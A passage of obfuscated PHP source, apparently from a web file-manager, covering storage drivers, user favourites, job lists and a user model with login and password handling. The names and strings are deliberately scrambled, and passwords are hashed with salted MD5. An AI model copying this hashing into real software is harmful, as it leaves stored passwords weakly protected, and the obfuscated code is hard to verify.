= $this->bucketManager->stat($this->bucket, $ªá‘‡¯); if ($ê÷¥ØÚ) { $ê÷¥ØÚ[$šµéÁİ“[79]] = intval($ê÷¥ØÚ[$šµéÁİ“[1673]]); } return $ê÷¥ØÚ; } protected function _isFolder($¼ÉúÖÃÆ) { $î–Ş´®š =& $_SERVER[¿ÈˆÑ¸ä]; if ($¼ÉúÖÃÆ == $î–Ş´®š[12] || $¼ÉúÖÃÆ == $î–Ş´®š[8]) { return !0; } list($¾“›î, $Ô‚Ëî„Ô) = $this->bucketManager->listFiles($this->bucket, trim($¼ÉúÖÃÆ, $î–Ş´®š[8]) . $î–Ş´®š[8], $î–Ş´®š[12], 1, $î–Ş´®š[8]); return !empty($¾“›î[$î–Ş´®š[1676]]) || !empty($¾“›î[$î–Ş´®š[1677]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Š‰É‚óÛ, $ÓªØ—ş± = 0) { parent::__construct(); $this->source = $Š‰É‚óÛ; $this->sourceSize = $ÓªØ—ş±; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ä³ˆ©¡İ = false) { return $this->sourceSize; } public function getContent($øƒİö‘ß = false) { return $this->fileSubstr($øƒİö‘ß, 0, $this->sourceSize); } public function fileSubstr($™ŒÖ˜‚¶ = false, $öÊÓÕ· = 0, $Í÷‹¡«ô = 0) { if (!$Í÷‹¡«ô) { $Í÷‹¡«ô = $this->sourceSize; } $ğòĞ‚Ó = $this->sourceSize - $öÊÓÕ·; if ($Í÷‹¡«ô >= $ğòĞ‚Ó) { $Í÷‹¡«ô = $ğòĞ‚Ó; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $öÊÓÕ·, $Í÷‹¡«ô); } if ($this->sourceType == self::TYPE_FILE) { if ($Í÷‹¡«ô <= 0) { return $_SERVER[¿ÈˆÑ¸ä][12]; } $Ç£Â¾î¯ = ftell($this->source); fseek_64($this->source, $Ç£Â¾î¯ + $öÊÓÕ·); $Ó¶î¨”ê = @fread($this->source, $Í÷‹¡«ô); fseek_64($this->source, $Ç£Â¾î¯); return $Ó¶î¨”ê; } } public function hashMd5($ğ¶èø£ı = false) { return md5($this->getContent()); } public static function hash($¿¾ŞèêÄ, $†ş†Øª¼ = 0) { $ÜãÖÕ¬ = new PathDriverStream($¿¾ŞèêÄ, $†ş†Øª¼); return $ÜãÖÕ¬->hashSimple($¿¾ŞèêÄ); } public static function md5($é»»ôÑ¸, $·”È“º = 0) { $²©†Ÿà = new PathDriverStream($é»»ôÑ¸, $·”È“º); return $²©†Ÿà->hashMd5($é»»ôÑ¸); } } goto f½åŸ†¡Ïí; eÇ­ÀÀ“•ò: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($ÁÅèÙ°¯) { $ºûèŸ»¼ =& $_SERVER[¿ÈˆÑ¸ä]; return array($ºûèŸ»¼[2234] => array(USER_ID, $ºûèŸ»¼[2613])); } protected function ___listData() { $ñ‰ŞŸß =& $_SERVER[¿ÈˆÑ¸ä]; $¼÷÷ì†½ = array($ñ‰ŞŸß[1907] => USER_ID, $ñ‰ŞŸß[569] => 0); $‰ ¦Ëôñ = $ñ‰ŞŸß[2614]; $¡ŸÏ™Õ = $this->field($‰ ¦Ëôñ)->where($¼÷÷ì†½)->order($ñ‰ŞŸß[2615])->select(); return $¡ŸÏ™Õ ? $¡ŸÏ™Õ : array(); } protected function resetCache() { } protected function listView() { $Í‚»§³¼ =& $_SERVER[¿ÈˆÑ¸ä]; $ËÛ•ğ¯ü = $this->listData(); $Ã§Æ…½» = array_filter_by_field($ËÛ•ğ¯ü, $Í‚»§³¼[33], $Í‚»§³¼[501]); $ó™Îãİ¬ = array_to_keyvalue($Ã§Æ…½», $Í‚»§³¼[12], $Í‚»§³¼[87]); if (!$ó™Îãİ¬) { return $ËÛ•ğ¯ü; } $§”ÃÒ¿™ = 2000; $““×ĞÃ = array($Í‚»§³¼[502] => array($Í‚»§³¼[503], $ó™Îãİ¬)); $Æğ§ˆš± = Model($Í‚»§³¼[916])->listSource($““×ĞÃ, $§”ÃÒ¿™); $Æğ§ˆš± = array_merge($Æğ§ˆš±[$Í‚»§³¼[86]], $Æğ§ˆš±[$Í‚»§³¼[85]]); $Æğ§ˆš± = array_to_keyvalue($Æğ§ˆš±, $Í‚»§³¼[192]); foreach ($ËÛ•ğ¯ü as $×êÆà§ò => $Ş¥¬Í€‰) { $Ÿ±Æ¬’è = $Æğ§ˆš±[$Ş¥¬Í€‰[$Í‚»§³¼[87]]]; $Ÿ±Æ¬’è = $Ÿ±Æ¬’è ? $Ÿ±Æ¬’è : array(); $ËÛ•ğ¯ü[$×êÆà§ò] = array_merge($Ÿ±Æ¬’è, $Ş¥¬Í€‰); } return $ËÛ•ğ¯ü; } protected function addFav($«°±¤Ìç, $»Ñ…ıá = '', $ñÂ÷ÎŸı = "\x73\x6f\165\162\143\x65") { $Î±ü½¼Í =& $_SERVER[¿ÈˆÑ¸ä]; $„õ ÙµÉ = array($Î±ü½¼Í[1907] => USER_ID, $Î±ü½¼Í[569] => 0, $Î±ü½¼Í[507] => $ñÂ÷ÎŸı, $Î±ü½¼Í[506] => $«°±¤Ìç); if ($this->where($„õ ÙµÉ)->find()) { return !1; } $„õ ÙµÉ = array($Î±ü½¼Í[1907] => USER_ID, $Î±ü½¼Í[569] => 0); $ãùŸòí = $this->where($„õ ÙµÉ)->max($Î±ü½¼Í[2144]); if (!$ãùŸòí) { $ãùŸòí = 0; } if (!$»Ñ…ıá && $ñÂ÷ÎŸı == $Î±ü½¼Í[501]) { $°ËÜã¡ = Model($Î±ü½¼Í[1469])->where(array($Î±ü½¼Í[502] => $«°±¤Ìç))->find(); if (!$°ËÜã¡) { return !1; } $»Ñ…ıá = $°ËÜã¡[$Î±ü½¼Í[32]]; } $»Ñ…ıá = $this->getAutoName($»Ñ…ıá); $³ê¡ ‹È = array($Î±ü½¼Í[1907] => USER_ID, $Î±ü½¼Í[569] => 0, $Î±ü½¼Í[505] => $»Ñ…ıá, $Î±ü½¼Í[506] => $«°±¤Ìç, $Î±ü½¼Í[507] => $ñÂ÷ÎŸı, $Î±ü½¼Í[2126] => $ãùŸòí + 1); return $this->add($³ê¡ ‹È); } protected function remove($ÅìØÉ) { $ıôõíÅŒ =& $_SERVER[¿ÈˆÑ¸ä]; $»¨ºÇöá = array($ıôõíÅŒ[1907] => USER_ID, $ıôõíÅŒ[504] => $ÅìØÉ); return $this->where($»¨ºÇöá)->delete(); } protected function removeByName($Â‘õ©ã¾) { $…Ñ…’…­ =& $_SERVER[¿ÈˆÑ¸ä]; $¡£ÉñÅ± = array($…Ñ…’…­[1907] => USER_ID, $…Ñ…’…­[505] => $Â‘õ©ã¾, $…Ñ…’…­[569] => 0); return $this->where($¡£ÉñÅ±)->delete(); } protected function rename($‘á¼×Ô‘, $¶ôü™ÄÁ) { $åÍ¢ÚÔé =& $_SERVER[¿ÈˆÑ¸ä]; if ($‘á¼×Ô‘ == $¶ôü™ÄÁ) { return !1; } $ÄŸß£Ğö = $this->getAutoName($¶ôü™ÄÁ); if ($¶ôü™ÄÁ != $ÄŸß£Ğö) { return !1; } $Óåâ™ÂŠ = array($åÍ¢ÚÔé[1907] => USER_ID, $åÍ¢ÚÔé[569] => 0, $åÍ¢ÚÔé[32] => $‘á¼×Ô‘); return $this->where($Óåâ™ÂŠ)->save(array($åÍ¢ÚÔé[32] => $¶ôü™ÄÁ)); } protected function resetSort($°û­å£) { $Ó­ºõœ™ =& $_SERVER[¿ÈˆÑ¸ä]; $°û­å£ = is_array($°û­å£) ? $°û­å£ : array(); $â‡şü× = array($Ó­ºõœ™[1907] => USER_ID); for ($ºÕç›”ã = 0; $ºÕç›”ã < count($°û­å£); $ºÕç›”ã++) { $â‡şü×[$Ó­ºõœ™[504]] = $°û­å£[$ºÕç›”ã]; $this->where($â‡şü×)->save(array($Ó­ºõœ™[2126] => $ºÕç›”ã + 1)); } return !0; } protected function moveTop($ş‘ºªğÕ) { $ˆˆã› =& $_SERVER[¿ÈˆÑ¸ä]; $×—¥¬Ø¡ = array($ˆˆã›[1907] => USER_ID, $ˆˆã›[569] => 0); $¾ğË…öÆ = $this->where($×—¥¬Ø¡)->where(array($ˆˆã›[32] => $ş‘ºªğÕ))->find(); if (!$¾ğË…öÆ) { return; } $ÛÚ¿Úé³ = $this->field($ˆˆã›[483])->where($×—¥¬Ø¡)->order($ˆˆã›[2615])->select(); $ÛÚ¿Úé³ = array_to_keyvalue($ÛÚ¿Úé³, $ˆˆã›[12], $ˆˆã›[483]); $—óˆéŒ = $ÛÚ¿Úé³; $ÛÚ¿Úé³ = array_remove_value($ÛÚ¿Úé³, $¾ğË…öÆ[$ˆˆã›[483]]); array_unshift($ÛÚ¿Úé³, $¾ğË…öÆ[$ˆˆã›[483]]); return $this->resetSort($ÛÚ¿Úé³); } protected function moveBottom($çîîà…À) { $âµ“ìŸ¡ =& $_SERVER[¿ÈˆÑ¸ä]; $ïëû¶è = array($âµ“ìŸ¡[1907] => USER_ID, $âµ“ìŸ¡[569] => 0); $µ°§¹‚“ = $this->where($ïëû¶è)->max($âµ“ìŸ¡[2144]); $Ñ éêç = array($âµ“ìŸ¡[2144] => $µ°§¹‚“ + 1); return $this->where($ïëû¶è)->where(array($âµ“ìŸ¡[32] => $çîîà…À))->save($Ñ éêç); } private function getAutoName($®æù¿Øè) { $çãıôø =& $_SERVER[¿ÈˆÑ¸ä]; $§ÆÌ¯ = array($çãıôø[1907] => USER_ID, $çãıôø[569] => 0); $ÅÚ÷ Õà = $this->field($çãıôø[32])->where($§ÆÌ¯)->select(); $ÅÚ÷ Õà = array_to_keyvalue($ÅÚ÷ Õà, $çãıôø[12], $çãıôø[32]); if (!$ÅÚ÷ Õà || !in_array($®æù¿Øè, $ÅÚ÷ Õà)) { return $®æù¿Øè; } for ($äÊÄòÔÛ = 0; $äÊÄòÔÛ < count($ÅÚ÷ Õà); $äÊÄòÔÛ++) { if (!in_array($®æù¿Øè . "\x28{$äÊÄòÔÛ}\51", $ÅÚ÷ Õà)) { return $®æù¿Øè . "\50{$äÊÄòÔÛ}\51"; } } return $®æù¿Øè . "\50{$äÊÄòÔÛ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\152\x6f\142\x4c\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\x64\x65\163\x63", "\163\x6f\162\164"); const JOB_KEY = "\x73\145\154\146\112\157\142\x4c\x69\163\x74"; public function listData($ŸÙ««×Æ = false, $Ùªç‹«Õ = "\x73\x6f\x72\x74", $ÙÒ±¤Ûè = false) { return parent::listData($ŸÙ««×Æ, $Ùªç‹«Õ, $ÙÒ±¤Ûè); } public function remove($‚ç“ùó™) { return parent::remove($‚ç“ùó™); } public function add($Âç³£­) { $¤âø‚¾  =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->findByName($Âç³£­[$¤âø‚¾ [32]])) { return !1; } $Âç³£­[$¤âø‚¾ [2144]] = $this->getSort(); return parent::insert($Âç³£­); } private function getSort() { $ø±†‰™‹ =& $_SERVER[¿ÈˆÑ¸ä]; $±³å§ù› = parent::listData(); $ÑáÔÅÀÎ = array_to_keyvalue($±³å§ù›, $ø±†‰™‹[12], $ø±†‰™‹[2144]); return empty($ÑáÔÅÀÎ) ? 0 : max($ÑáÔÅÀÎ) + 1; } public function update($˜Ü¤Å, $ˆ‡î­¼Ë) { $¹®º‡‘„ =& $_SERVER[¿ÈˆÑ¸ä]; $–ÄÈ·ï = parent::listData($˜Ü¤Å); $‰‹õ”™š = $this->findByName($ˆ‡î­¼Ë[$¹®º‡‘„[32]]); if (!$–ÄÈ·ï || $‰‹õ”™š && $‰‹õ”™š[$¹®º‡‘„[483]] != $–ÄÈ·ï[$¹®º‡‘„[483]]) { return !1; } return parent::update($˜Ü¤Å, $ˆ‡î­¼Ë); } public function setUserJob($Íƒâüˆç, $Úê°¼Œ…) { $‰×áš‹× =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_array($Úê°¼Œ…)) { $Úê°¼Œ… = array($Úê°¼Œ…); } $ëÂÖ•û = parent::listData(); $¾¡ˆÈ¥Ì = array_to_keyvalue($ëÂÖ•û, $‰×áš‹×[32]); $ÙˆÖ¿Ûô = $‰×áš‹×[463]; foreach ($Úê°¼Œ… as $¿Í£°Õ‰) { if ($¾¡ˆÈ¥Ì[$¿Í£°Õ‰]) { $ÙˆÖ¿Ûô .= $¾¡ˆÈ¥Ì[$¿Í£°Õ‰][$‰×áš‹×[483]] . $‰×áš‹×[50]; } else { $ÃÌÕ¯¯ = $this->add($¿Í£°Õ‰); $ÙˆÖ¿Ûô .= $ÃÌÕ¯¯ . $‰×áš‹×[50]; } } $ÙˆÖ¿Ûô = rtrim($ÙˆÖ¿Ûô, $‰×áš‹×[50]); Model($‰×áš‹×[613])->metaSet($Íƒâüˆç, self::JOB_KEY, $ÙˆÖ¿Ûô); } public function getUserJob($ø—Æ¼ƒŠ) { $¶ıÑÄÊÊ = Model($_SERVER[¿ÈˆÑ¸ä][613])->metaGet($ø—Æ¼ƒŠ); return $this->getUserJobInfo($¶ıÑÄÊÊ[self::JOB_KEY]); } public function getUserJobInfo($ÑŠ¿Øœ…) { $”æßåğ =& $_SERVER[¿ÈˆÑ¸ä]; $ÜÕ†è©É = explode($”æßåğ[50], $ÑŠ¿Øœ…); $äšÔÃÏé = parent::listData(); $äšÔÃÏé = array_remove_key($äšÔÃÏé, $”æßåğ[232]); $ß–û™·Ş = array(); foreach ($ÜÕ†è©É as $‘ú‰àş) { if (isset($äšÔÃÏé[$‘ú‰àş])) { $ß–û™·Ş[] = $äšÔÃÏé[$‘ú‰àş]; } } return $ß–û™·Ş; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\155\145" => "\x75\163\x65\x72\137\155\145\x74\x61", "\x6d\x65\164\141\106\151\x65\x6c\144" => "\165\x73\145\x72\x49\x44"); protected $simpleField = "\x75\x73\x65\162\111\104\54\x6e\x69\x63\x6b\116\141\x6d\145\54\156\x61\x6d\x65\54\x61\x76\141\x74\x61\x72\x2c\x73\145\x78\x2c\x73\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ì—Ø¡÷) { $”ë¤ªÑ =& $_SERVER[¿ÈˆÑ¸ä]; $¦Îï™§¶ = $”ë¤ªÑ[2616]; return array($”ë¤ªÑ[2201] => array($ì—Ø¡÷[0], $¦Îï™§¶), $”ë¤ªÑ[2203] => array($ì—Ø¡÷[0], $¦Îï™§¶), $”ë¤ªÑ[2617] => array($ì—Ø¡÷[0], $¦Îï™§¶)); } protected function ___getInfo($§ÒÍ€µˆ) { $ßÍ¬ØçÑ = $this->getInfoSimple($§ÒÍ€µˆ); if (!$ßÍ¬ØçÑ || !is_array($ßÍ¬ØçÑ)) { return array(); } return $this->_getInfoApply($ßÍ¬ØçÑ); } protected function ___getInfoFull($÷Å—Ù¼õ) { $³©ÜÂ›° = $this->getInfoSimple($÷Å—Ù¼õ); if (!$³©ÜÂ›° || !is_array($³©ÜÂ›°)) { return array(); } return $this->_getInfoApply($³©ÜÂ›°, !0); } protected function ___getInfoSimple($×©šõ°Ù) { $ã©±Í =& $_SERVER[¿ÈˆÑ¸ä]; if (!$×©šõ°Ù) { return array(); } $ˆÔ®ŸÊ” = $this->where(array($ã©±Í[1529] => intval($×©šõ°Ù)))->find(); if (!$ˆÔ®ŸÊ” || !is_array($ˆÔ®ŸÊ”)) { return array(); } $ˆÔ®ŸÊ”[$ã©±Í[2313]] = Action($ã©±Í[2314])->parseUrl($ˆÔ®ŸÊ”[$ã©±Í[2313]]); return $ˆÔ®ŸÊ”; } private function _getInfoApply($…ˆ†î¯æ, $àïÉ£Œü = false) { $¿Åô”£ğ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$…ˆ†î¯æ) { return $…ˆ†î¯æ; } $ãœÔÜÛ = md5($¿Åô”£ğ[2618] . $…ˆ†î¯æ[$¿Åô”£ğ[989]] . $¿Åô”£ğ[2619] . $…ˆ†î¯æ[$¿Åô”£ğ[32]]); $…ˆ†î¯æ = $this->_listDataApplyItem($…ˆ†î¯æ); $¬Ãéšò = Model($¿Åô”£ğ[1469])->metaGet($…ˆ†î¯æ[$¿Åô”£ğ[90]][$¿Åô”£ğ[192]]); $…ˆ†î¯æ[$¿Åô”£ğ[2620]] = $ãœÔÜÛ; $…ˆ†î¯æ[$¿Åô”£ğ[90]][$¿Åô”£ğ[2405]] = isset($¬Ãéšò[$¿Åô”£ğ[2406]]) ? $¬Ãéšò[$¿Åô”£ğ[2406]] : null; if ($àïÉ£Œü) { $…ˆ†î¯æ[$¿Åô”£ğ[551]] = $this->metaGet($…ˆ†î¯æ[$¿Åô”£ğ[1529]]); } return $…ˆ†î¯æ; } protected function getInfoSimpleOuter($­œîùÃ›) { $’«ãÎ¶± =& $_SERVER[¿ÈˆÑ¸ä]; if (!$­œîùÃ› || $­œîùÃ› == 0) { return array($’«ãÎ¶±[1529] => $’«ãÎ¶±[229], $’«ãÎ¶±[32] => $’«ãÎ¶±[174] . LNG($’«ãÎ¶±[2621]) . $’«ãÎ¶±[176], $’«ãÎ¶±[2313] => STATIC_PATH . $’«ãÎ¶±[2622]); } $®£ÀîÆ« = $this->cacheFunctionGet($’«ãÎ¶±[2212], $­œîùÃ›); $•›¿Ïêù = array_field_key($®£ÀîÆ«, explode($’«ãÎ¶±[50], $this->simpleField)); if (!$•›¿Ïêù) { return array($’«ãÎ¶±[1529] => $’«ãÎ¶±[1313], $’«ãÎ¶±[32] => $’«ãÎ¶±[174] . LNG($’«ãÎ¶±[2623]) . $’«ãÎ¶±[176], $’«ãÎ¶±[2313] => STATIC_PATH . $’«ãÎ¶±[2624]); } $•›¿Ïêù[$’«ãÎ¶±[2313]] = Action($’«ãÎ¶±[2314])->parseUrl($•›¿Ïêù[$’«ãÎ¶±[2313]]); return $•›¿Ïêù; } protected function groupUser($Òœ‹Ï ³) { } public static function errorLang($Ôì¢€áÊ) { $Û¨ëÍ =& $_SERVER[¿ÈˆÑ¸ä]; $ş›˜ìŞö = array(self::ERROR_USER_NOT_EXISTS => $Û¨ëÍ[2625], self::ERROR_USER_PASSWORD_ERROR => $Û¨ëÍ[2626], self::ERROR_USER_EXIST_NAME => $Û¨ëÍ[2627], self::ERROR_USER_EXIST_PHONE => $Û¨ëÍ[2628], self::ERROR_USER_EXIST_EMAIL => $Û¨ëÍ[2629], self::ERROR_USER_LOGIN_LOCK => $Û¨ëÍ[2630], self::ERROR_IP_NOT_ALLOW => $Û¨ëÍ[2631], self::ERROR_USER_EXIST_NICKNAME => $Û¨ëÍ[2632]); $Ÿ÷¨İúË = LNG($ş›˜ìŞö[$Ôì¢€áÊ]); if ($Ôì¢€áÊ == self::ERROR_USER_LOGIN_LOCK) { $ÊöÛ‹· = (int) Model($Û¨ëÍ[1425])->get($Û¨ëÍ[2633]); if ($ÊöÛ‹· > 60) { $Ÿ÷¨İúË = str_replace($Û¨ëÍ[91], ceil($ÊöÛ‹· / 60), $Ÿ÷¨İúË); } } return $Ÿ÷¨İúË; } protected function metaSet($éàå½ìè, $€¾³š„Í = null, $²§‹¼¿ˆ = null) { $this->clearCache($éàå½ìè); return parent::metaSet($éàå½ìè, $€¾³š„Í, $²§‹¼¿ˆ); } public function getInfoByMeta($¢ëÍ˜øó, $³ŠºÊÂ°) { $Ë·¿ºÊä =& $_SERVER[¿ÈˆÑ¸ä]; $›ï ›áà = Model($Ë·¿ºÊä[2634])->where(array($Ë·¿ºÊä[95] => $¢ëÍ˜øó, $Ë·¿ºÊä[451] => $³ŠºÊÂ°))->find(); if ($›ï ›áà) { return $this->getInfo($›ï ›áà[$Ë·¿ºÊä[1529]]); } return !1; } public function userLoginCheck($Ó¡Ùèö€, $¡š½ä×İ, $”µ²­ò = false) { $ìœÇúö =& $_SERVER[¿ÈˆÑ¸ä]; $ŒØÓƒà¶ = $this->userLoginFind($Ó¡Ùèö€); if (!$ŒØÓƒà¶) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ŒØÓƒà¶[$ìœÇúö[1529]], $¡š½ä×İ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $”µ²­ò ? $this->getInfoFull($ŒØÓƒà¶[$ìœÇúö[1529]]) : $this->getInfo($ŒØÓƒà¶[$ìœÇúö[1529]]); } public function userLoginFind($¬Ÿã†…‰) { $âÃ§â =& $_SERVER[¿ÈˆÑ¸ä]; $¨ÇŞ = array($âÃ§â[32] => $¬Ÿã†…‰, $âÃ§â[2418] => $¬Ÿã†…‰, $âÃ§â[381] => $¬Ÿã†…‰, $âÃ§â[2635] => $¬Ÿã†…‰, $âÃ§â[1103] => $âÃ§â[1105]); if ($this->nickNameRpt()) { unset($¨ÇŞ[$âÃ§â[2418]]); } return $this->where($¨ÇŞ)->find(); } public function clearCache($Öó—Ú½à) { $Â¾¯í®¾ =& $_SERVER[¿ÈˆÑ¸ä]; $this->cacheFunctionClear($Â¾¯í®¾[2211], $Öó—Ú½à); $this->cacheFunctionClear($Â¾¯í®¾[2212], $Öó—Ú½à); $this->cacheFunctionClear($Â¾¯í®¾[2636], $Öó—Ú½à); } public function userPasswordCheck($ƒó¶éõî, $ı½¾š—Ç) { $¯´â¦±Ù =& $_SERVER[¿ÈˆÑ¸ä]; $µ†ˆÒ‚Ö = $this->where(array($¯´â¦±Ù[1529] => intval($ƒó¶éõî)))->find(); $€®¯ şÎ = $this->metaGet($ƒó¶éõî); $ø—‡Õ = isset($€®¯ şÎ[$¯´â¦±Ù[2637]]) ? $€®¯ şÎ[$¯´â¦±Ù[2637]] : $¯´â¦±Ù[12]; if (md5($ø—‡Õ . trim($ı½¾š—Ç)) !== $µ†ˆÒ‚Ö[$¯´â¦±Ù[989]]) { return !1; } return !0; } public function userAdd($Ú±©‡Ø¯) { $ÑÉãÄıª =& $_SERVER[¿ÈˆÑ¸ä]; $¤Û©î®Õ = array($ÑÉãÄıª[505] => $Ú±©‡Ø¯[$ÑÉãÄıª[32]], $ÑÉãÄıª[2638] => $Ú±©‡Ø¯[$ÑÉãÄıª[2312]], $ÑÉãÄıª[2639] => isset($Ú±©‡Ø¯[$ÑÉãÄıª[381]]) ? $Ú±©‡Ø¯[$ÑÉãÄıª[381]] : $ÑÉãÄıª[12], $ÑÉãÄıª[2640] => isset($Ú±©‡Ø¯[$ÑÉãÄıª[2635]]) ? $Ú±©‡Ø¯[$ÑÉãÄıª[2635]] : $ÑÉãÄıª[12], $ÑÉãÄıª[2641] => isset($Ú±©‡Ø¯[$ÑÉãÄıª[2418]]) ? $Ú±©‡Ø¯[$ÑÉãÄıª[2418]] : $Ú±©‡Ø¯[$ÑÉãÄıª[32]], $ÑÉãÄıª[2642] => isset($Ú±©‡Ø¯[$ÑÉãÄıª[2313]]) ? $Ú±©‡Ø¯[$ÑÉãÄıª[2313]] : $ÑÉãÄıª[12], $ÑÉãÄıª[2643] => isset($Ú±©‡Ø¯[$ÑÉãÄıª[2644]]) ? $Ú±©‡Ø¯[$ÑÉãÄıª[2644]] : 1, $ÑÉãÄıª[2645] => $Ú±©‡Ø¯[$ÑÉãÄıª[989]], $ÑÉãÄıª[2205] => isset($Ú±©‡Ø¯[$ÑÉãÄıª[2109]]) ? $Ú±©‡Ø¯[$ÑÉãÄıª[2109]] : 1024 * 1024 * 20, $ÑÉãÄıª[2206] => 0, $ÑÉãÄıª[2646] => 0, $ÑÉãÄıª[2251] => isset($Ú±©‡Ø¯[$ÑÉãÄıª[833]]) ? $Ú±©‡Ø¯[$ÑÉãÄıª[833]] : 1); if (!empty($Ú±©‡Ø¯[$ÑÉãÄıª[1529]])) { $¤Û©î®Õ[$ÑÉãÄıª[1529]] = $Ú±©‡Ø¯[$ÑÉãÄıª[1529]]; } $Á¸¯§·½ = $this->_checkExist($Ú±©‡Ø¯); if ($Á¸¯§·½ !== !0) { return $Á¸¯§·½; } if (!empty($¤Û©î®Õ[$ÑÉãÄıª[2313]]) && strlen($¤Û©î®Õ[$ÑÉãÄıª[2313]]) > 255) { $¤Û©î®Õ[$ÑÉãÄıª[2313]] = $ÑÉãÄıª[12]; } $õÔÙ®õ¡ = $this->add($¤Û©î®Õ); $“ÈĞ±•á = array($ÑÉãÄıª[2645] => $¤Û©î®Õ[$ÑÉãÄıª[989]], $ÑÉãÄıª[2641] => $¤Û©î®Õ[$ÑÉãÄıª[2418]], $ÑÉãÄıª[2647] => $Ú±©‡Ø¯[$ÑÉãÄıª[2210]]); $this->userEdit($õÔÙ®õ¡, $“ÈĞ±•á); Model($ÑÉãÄıª[1469])->userRootAdd($õÔÙ®õ¡); return $õÔÙ®õ¡; } protected function userEditTest($ëûŠ, $„ˆ‘İ¯›) { return $this->call($_SERVER[¿ÈˆÑ¸ä][2648], $ëûŠ, $„ˆ‘İ¯›); } protected function userEdit($­î¹ÕÕ, $Ö¨ÊæÉä) { $•‰íÑõÇ =& $_SERVER[¿ÈˆÑ¸ä]; $øª¯Õ“º = $this->getInfoSimple($­î¹ÕÕ); if (!$øª¯Õ“º) { return !1; } $×°Èâ¡¸ = $this->_checkExist($Ö¨ÊæÉä, $­î¹ÕÕ); if ($×°Èâ¡¸ !== !0) { return $×°Èâ¡¸; } if (isset($Ö¨ÊæÉä[$•‰íÑõÇ[989]]) && trim($Ö¨ÊæÉä[$•‰íÑõÇ[989]]) != $•‰íÑõÇ[12]) { $”‘‚½ê = $this->metaGet($­î¹ÕÕ); if (empty($”‘‚½ê[$•‰íÑõÇ[2637]])) { $”‘‚½ê[$•‰íÑõÇ[2637]] = rand_string(10); Model($•‰íÑõÇ[593])->metaSet($­î¹ÕÕ, $•‰íÑõÇ[2637], $”‘‚½ê[$•‰íÑõÇ[2637]]); } $Ö¨ÊæÉä[$•‰íÑõÇ[989]] = md5($”‘‚½ê[$•‰íÑõÇ[2637]] . trim($Ö¨ÊæÉä[$•‰íÑõÇ[989]])); } else { unset($Ö¨ÊæÉä[$•‰íÑõÇ[989]]); } if (!empty($Ö¨ÊæÉä[$•‰íÑõÇ[2313]]) && strlen($Ö¨ÊæÉä[$•‰íÑõÇ[2313]]) > 255) { $Ö¨ÊæÉä[$•‰íÑõÇ[2313]] = $•‰íÑõÇ[12]; } if (isset($Ö¨ÊæÉä[$•‰íÑõÇ[2418]])) { $this->setNamePinyin($­î¹ÕÕ, $Ö¨ÊæÉä[$•‰íÑõÇ[2418]]); } if (isset($Ö¨ÊæÉä[$•‰íÑõÇ[2210]])) { $Ú¯Î»İ‘ = $•‰íÑõÇ[1428] . $­î¹ÕÕ; $ú¤õêü– = $•‰íÑõÇ[1426]; $Õ˜é·Ñö = $Ö¨ÊæÉä[$•‰íÑõÇ[2210]] ? $Ö¨ÊæÉä[$•‰íÑõÇ[2210]] : $•‰íÑõÇ[12]; $éç¾ö× = Model($•‰íÑõÇ[1425])->get($Ú¯Î»İ‘, $ú¤õêü–); $éç¾ö× = $éç¾ö× ? $éç¾ö× : $•‰íÑõÇ[12]; if ($éç¾ö× != $Õ˜é·Ñö) { if (!$Õ˜é·Ñö && $éç¾ö×) { Model($•‰íÑõÇ[1425])->remove($Ú¯Î»İ‘, $ú¤õêü–); } else { if ($Õ˜é·Ñö) { Model($•‰íÑõÇ[1425])->set($Ú¯Î»İ‘, $Õ˜é·Ñö, $ú¤õêü–); } } } unset($Ö¨ÊæÉä[$•‰íÑõÇ[2210]]); Model($•‰íÑõÇ[613])->metaSet($­î¹ÕÕ, $•‰íÑõÇ[2210], $Õ˜é·Ñö); } if (empty($Ö¨ÊæÉä)) { return !0; } $this->where(array($•‰íÑõÇ[1907] => $­î¹ÕÕ))->save($Ö¨ÊæÉä); $this->clearCache($­î¹ÕÕ); return !0; } public function setNamePinyin($ùïªÚ§”, $¨ê»·º = false) { $ã¶îÔãõ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$¨ê»·º) { $á·ı•Ò« = $this->getInfoSimple($ùïªÚ§”); $¨ê»·º = $á·ı•Ò«[$ã¶îÔãõ[2418]] ? $á·ı•Ò«[$ã¶îÔãõ[2418]] : $á·ı•Ò«[$ã¶îÔãõ[32]]; } $‚´ç¬¶ = Model($ã¶îÔãõ[613]); if (!Input::check($¨ê»·º, $ã¶îÔãõ[674])) { return $‚´ç¬¶->metaSet($ùïªÚ§”, array($ã¶îÔãõ[548] => $ã¶îÔãõ[12], $ã¶îÔãõ[547] => $ã¶îÔãõ[12])); } return $‚´ç¬¶->metaSet($ùïªÚ§”, array($ã¶îÔãõ[548] => str_replace($ã¶îÔãõ[53], $ã¶îÔãõ[12], Pinyin::get($¨ê»·º)), $ã¶îÔãõ[547] => Pinyin::get($¨ê»·º, $ã¶îÔãõ[675]))); } private function nickNameRpt() { $ğîüíÀò =& $_SERVER[¿ÈˆÑ¸ä]; $£İ·³•ı = Model($ğîüíÀò[856])->get($ğîüíÀò[2649]); $ª³¤ö‡õ = $GLOBALS[$ğîüíÀò[6]][$ğîüíÀò[468]][$ğîüíÀò[2649]]; $¸ø¢¾®‡ = !is_null($£İ·³•ı) ? $£İ·³•ı : 